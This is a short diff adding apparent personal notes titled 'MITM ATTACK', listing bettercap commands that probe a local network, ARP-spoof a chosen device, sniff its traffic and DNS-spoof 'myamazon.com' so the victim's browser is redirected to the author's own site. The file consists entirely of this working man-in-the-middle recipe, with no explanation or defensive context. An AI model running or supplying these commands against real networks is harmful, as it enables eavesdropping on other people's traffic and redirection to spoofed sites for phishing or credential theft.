@@ -1,0 +1,17 @@
+MITM ATTACK
+
+sudo bettercap
+
+net.probe.on
+
+set arp.spoof.targets <ipofdevice>
+
+arp.spoof on
+
+net.sniff on
+
+target device to change site of my own
+set dns.spoof.domains myamazon.com
+dns.spoof on
+for redirecting
+type myamazon.com in browser
